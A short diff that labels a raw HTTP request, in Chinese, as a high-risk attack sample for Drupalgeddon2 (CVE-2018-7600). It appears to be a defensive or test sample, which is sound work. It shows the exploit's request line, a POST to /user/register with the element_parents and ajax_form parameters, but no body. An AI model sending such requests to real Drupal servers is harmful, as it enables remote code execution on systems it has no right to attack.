@@ -1,3 +1,4 @@
+# 高危攻击请求，对应著名漏洞 Drupalgeddon2（CVE-2018-7600）
 POST /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1
 Host: 10.10.3.128
 Accept-Encoding: gzip, deflate
